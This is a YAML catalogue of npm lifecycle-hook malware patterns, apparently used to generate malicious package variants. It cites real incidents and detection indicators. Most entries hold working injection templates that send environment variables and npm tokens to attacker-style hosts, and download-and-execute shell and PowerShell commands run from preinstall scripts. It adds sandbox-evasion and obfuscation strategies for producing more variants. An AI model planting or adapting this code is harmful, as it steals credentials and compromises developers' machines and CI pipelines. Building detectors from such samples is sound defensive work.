patterns:
  - id: postinstall_env_exfil
    family: lifecycle_hijack
    severity: critical
    real_world_examples:
      - name: "ua-parser-js@0.7.29"
        date: "2021-10-22"
        url: "https://www.bleepingcomputer.com/news/security/popular-npm-library-hijacked-to-install-password-stealers-miners/"
      - name: "coa@2.0.3"
        date: "2021-11-04"
        url: "https://www.sonatype.com/blog/npm-hijackers-at-it-again-popular-coa-and-rc-open-source-libraries-taken-over-to-spread-malware"
      - name: "rc@1.2.9"
        date: "2021-11-04"
        url: "https://www.sonatype.com/blog/npm-hijackers-at-it-again-popular-coa-and-rc-open-source-libraries-taken-over-to-spread-malware"
      - name: "@bitwarden/cli@2026.4.0 (Shai-Hulud wave)"
        date: "2026-04-22"
        url: "https://unit42.paloaltonetworks.com/npm-supply-chain-attack/"
    description: |
      A postinstall lifecycle script reads environment variables
      (typically AWS keys, npm tokens, SSH key paths, CI secrets) and
      POSTs them to an attacker-controlled endpoint. This is the single
      most common npm malware pattern. The script runs automatically
      during `npm install` with no user interaction.
    indicators:
      - postinstall key in package.json scripts
      - '"process.env" access in install script'
      - '"http.request" / "fetch" / "https.get" / "axios.post" to non-localhost'
      - base64 or hex encoding of collected data before send
      - URL with short-link services (bit.ly, t.ly, ow.ly)
      - URL with suspicious TLDs (.tk, .xyz, .club, .ru, .top)
      - JSON.stringify(process.env) as request body
      - require('os').hostname() or userInfo() calls in install script
    injection_template_js: |
      // injected as postinstall.js
      const https = require('https');
      const os = require('os');
      const payload = Buffer.from(JSON.stringify({
        env: process.env,
        host: os.hostname(),
        user: os.userInfo().username,
        cwd: process.cwd(),
        pid: process.pid
      })).toString('base64');
      const opts = new URL('{{EXFIL_URL}}');
      const req = https.request({
        hostname: opts.hostname,
        path: opts.pathname,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-d': payload.slice(0, 8) }
      }, () => {});
      req.on('error', () => {});
      req.write(JSON.stringify({ d: payload }));
      req.end();
    injection_target_files:
      - '''package.json: add "scripts.postinstall": "node ./postinstall.js"'''
      - '"postinstall.js: new file with payload above"'
    template_variables:
      EXFIL_URL:
        - '"https://npm-stats.tk/collect"'
        - '"https://pkg-report.xyz/r"'
        - '"https://cdn-assets.club/log"'
        - '"https://t.ly/npm99"'
        - '"https://analytics-cdn.top/ev"'
        - '"https://node-telemetry.ru/ping"'
        - '"https://eyj7s8.bit.ly/c"'
        - '"https://collect.azurewebsites.net.evil.xyz/r"'
    variants_to_generate: 10
    diversity_strategies:
      - rename variables to single letters (a, b, c)
      - use axios instead of built-in https
      - use node-fetch with require('node-fetch')
      - encode payload with hex instead of base64
      - split EXFIL_URL across string concatenation
      - add benign-looking comments referencing analytics
      - move payload into a separate helper module
      - use setTimeout to delay execution after install
      - use XMLHttpRequest via jsdom if available
      - collect only specific vars (AWS_ACCESS_KEY_ID, NPM_TOKEN, GITHUB_TOKEN)

  - id: preinstall_shell_payload
    family: lifecycle_hijack
    severity: critical
    real_world_examples:
      - name: "ua-parser-js@0.7.29 (Linux preinstall.sh)"
        date: "2021-10-22"
        url: "https://www.cisa.gov/news-events/alerts/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js"
      - name: "@cap-js/sqlite@2.2.2 (SAP CAP-JS wave)"
        date: "2026-04-29"
        url: "https://unit42.paloaltonetworks.com/npm-supply-chain-attack/"
    description: |
      A preinstall script (run before any files are unpacked) drops a shell
      script or batch file and executes it. On Linux/macOS it uses /bin/bash
      or /bin/sh; on Windows it uses cmd.exe or PowerShell. This executes
      before the package's own code is loaded, giving the attacker a head
      start on detection evasion.
    indicators:
      - preinstall key in package.json scripts
      - shell invocations in the script value (bash, sh, cmd.exe, powershell)
      - platform detection via process.platform
      - download-and-execute pattern (curl | bash, wget -O- | sh)
      - embedded .bat or .sh files in the tarball
      - preinstall.js that spawns child_process.exec or spawnSync
    injection_template_js: |
      // injected as preinstall.js
      const { execSync, spawnSync } = require('child_process');
      const os = require('os');
      const isWin = process.platform === 'win32';
      try {
        if (isWin) {
          spawnSync('cmd.exe', ['/c', '{{WIN_CMD}}'], { stdio: 'ignore', timeout: 8000 });
        } else {
          // skip CIS/sandbox regions
          const locale = (process.env.LANG || '').slice(0, 2);
          if (!['ru', 'uk', 'be', 'kk'].includes(locale)) {
            spawnSync('/bin/sh', ['-c', '{{LINUX_CMD}}'], { stdio: 'ignore', timeout: 8000 });
          }
        }
      } catch (_) {}
    injection_target_files:
      - '''package.json: add "scripts.preinstall": "node ./preinstall.js"'''
      - '"preinstall.js: new file with payload above"'
    template_variables:
      WIN_CMD:
        - '"powershell -W Hidden -c \"iex (iwr ''{{EXFIL_URL}}'').Content\""'
        - '"curl -s {{EXFIL_URL}} -o %TEMP%\\svc.exe && %TEMP%\\svc.exe"'
        - '"certutil -urlcache -split -f {{EXFIL_URL}} %TEMP%\\s.exe && %TEMP%\\s.exe"'
      LINUX_CMD:
        - '"curl -sfL {{EXFIL_URL}} | bash"'
        - '"wget -q -O /tmp/.s {{EXFIL_URL}} && chmod +x /tmp/.s && /tmp/.s &"'
        - '"bash <(curl -s {{EXFIL_URL}}) &"'
      EXFIL_URL:
        - '"https://npm-cdn.tk/setup"'
        - '"https://raw.githubusercontent.com/evil-user/repo/main/s.sh"'
        - '"https://pkg-utils.xyz/install.sh"'
    variants_to_generate: 8
    diversity_strategies:
      - use process.execPath to run node itself for the payload
      - check for CI environment vars (TRAVIS, GITHUB_ACTIONS) and skip
      - split the URL across a Buffer.from().toString() decode
      - use child_process.fork instead of spawnSync

  - id: prepare_script_hijack
    family: lifecycle_hijack
    severity: high
    real_world_examples:
      - name: "node-ipc@10.1.1 (protestware - disk wipe)"
        date: "2022-03-15"
        url: "https://www.stepsecurity.io/blog/node-ipc-npm-supply-chain-attack"
      - name: "colors.js@1.4.44-liberty-2 (protestware)"
        date: "2022-01-08"
        url: "https://snyk.io/blog/npm-security-preventing-supply-chain-attacks/"
    description: |
      The "prepare" lifecycle hook runs during `npm publish` AND during
      `npm install` for git dependencies. Attackers inject malicious code
      into the prepare script to target developers who pull packages
      directly from git, or to execute during CI publish pipelines.
      Also covers intentional sabotage by a maintainer ("protestware").
    indicators:
      - prepare key in package.json scripts with non-build commands
      - access to process.env inside prepare script
      - network requests in prepare script
      - fs.writeFileSync calls targeting user home directory (~/)
      - fs.unlinkSync or rm -rf patterns
    injection_template_js: |
      // injected into prepare.js, called by "scripts.prepare": "node prepare.js"
      const https = require('https');
      const os = require('os');
      const path = require('path');
      const fs = require('fs');
      // collect npm publish token from env if present
      const token = process.env.NPM_TOKEN
        || process.env.NODE_AUTH_TOKEN
        || process.env.npm_config__auth
        || '';
      if (token) {
        const body = JSON.stringify({ t: token, u: os.userInfo().username, h: os.hostname() });
        const req = https.request('{{EXFIL_URL}}', { method: 'POST' }, () => {});
        req.on('error', () => {});
        req.write(body);
        req.end();
      }
    injection_target_files:
      - '''package.json: modify "scripts.prepare" to append "&& node ./prepare.js"'''
      - '"prepare.js: new file with payload"'
    template_variables:
      EXFIL_URL:
        - '"https://token-collector.xyz/np"'
        - '"https://publish-log.tk/r"'
        - '"https://npm-audit.club/t"'
        - '"https://ci-telemetry.top/log"'
    variants_to_generate: 6
    diversity_strategies:
      - look for both NPM_TOKEN and GITHUB_TOKEN
      - encode token in URL query param instead of body
      - use a DNS-based channel (see dns_exfil pattern)

